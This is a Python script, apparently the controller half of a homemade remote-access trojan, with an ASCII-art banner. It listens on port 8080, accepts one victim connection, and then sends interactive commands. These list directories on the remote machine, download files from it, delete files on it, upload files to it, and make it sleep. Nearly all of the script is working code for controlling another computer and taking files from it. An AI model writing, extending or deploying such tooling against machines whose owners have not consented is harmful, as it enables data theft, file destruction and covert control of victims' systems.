import os
import socket

s = socket.socket()
host = socket.gethostname()
port = 8080

print("111111                               1111111111111")
print("111111                               1111111111111")
print("1111                                   11111111111")
print("                                         111111111")
print("                                           1111111")
print("               1░▒░░01                      111111")
print("              1▒▒▒▒░░▒▒░░░0001               11111")
print("             10▓▒▓▓▓▒░░▒░░░░░▒▒░01           11111")
print("             10▓▒▓▓▓▓▓▒░░░░░░░░░░▒▒░1        11111")
print("           10▒▓▓▒▒▓▓▓▓▒░░░░░░▒░░░░░░▒░1      11111")
print("          1▒▓▓▓▓▓▓▓▓▓▒░░░░░░░▒░1░▒▒░░▓01        11")
print("         0▒▒▒▓▓▓▓▓▓▓▓░░░░░░░░░▒░▒▒▒░░░▒░1         ")
print("        0▓▒░▓▓▓▓▓▓▓▒▓▓▒░▒▒░░░░░░░░░░░░░▒░1        ")
print("       1▓▓░░▓▓▓▓▓▓▒░▓▓▓▓▓▓▓▒▒▒▓▒▒░░░░▒░░▒▒1       ")
print("       10░▒▒▓▓▓▓▓▓▓▒░▒▓▓▓▓▓▓▓▓▓▓▒▒░░░░▒▓▓▒1       ")
print("        110░▒▓▓▓▓▓▓▓▒▒▒▓▓▓▓▓▓▓▒▒▒▒░░░░░▒▓0        ")
print("          111░▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░░▒▒▓▒0         ")
print("           11100▒▓▓▓▓▓▓▓▓▓░░░░▒▓▓▓▒▒▒▒▒1          ")
print("             11110▒▓▓▓▓▓▓░111110░▒▒▒▒▒01          ")
print("              111110▒▓▓▓▒011    111111            ")
print("                11111░▒▓▒01                     11")
print("111                1110░▒11                 111111")
print("111111111111111       1111              1111111111")
print("11111111111111111111          11111111111111111111")
print("00001111111111111111111111111111111111111111100000")
print("00000000001111111111111111111111111111000000000000")

s.bind((host,port))
print("")
print(" Server is currently running @ ",host)
print("")
print(" Waiting for any incoming connections...")
s.listen(1)
conn ,addr = s.accept()
print("")
print(addr,"Has connected to the server successfully ")

while 1:
    print("")
    command = input(str("Command >> "))
    if command == "view_cmd":
        conn.send(command.encode())
        print("")
        print("Command sent waiting for execution ... ")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Command outopt : ",files)

    elif command == "custom_dir":
        conn.send(command.encode())
        print("")
        user_input = input(str("Custom Dir : "))
        conn.send(user_input.encode())
        print("")
        print("Command has sent")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Custom Dir Result : ",files)

    elif command == "download_file":
        conn.send(command.encode())
        print("")
        filepath = input(str("Please enter the file path including the filename : "))
        conn.send(filepath.encode())
        file = conn.recv(100000)
        print("")
        filename = input(str("Please enter a filename for the incoming file including the extension : "))
        new_file = open(filename,"wb")
        new_file.write(file)
        new_file.close()
        print("")
        print(filename," Has been download and saved")
        print("")

    elif command == "remove_file":
        conn.send(command.encode())
        fileanddir =  input(str("Please enter the filename and drectory :"))
        conn.send(fileanddir.encode())
        print("")
        print("Command has been executed successfully : File Remove")

    elif command == "send_files":
        conn.send(command.encode())
        file = input(str("Please enter the filename and directory of the file :"))
        filename = input(str("Please enter the filename for the file being sent : "))
        data = open(file,"rb")
        file_data = data.read(7000)
        conn.send(filename.encode())
        print(file,"Has been sent successfully")
        conn.send(file_data)

    elif command == "sleep":
        conn.send(command.encode())
        

    else:
        print("")
        print("Command not recoonised")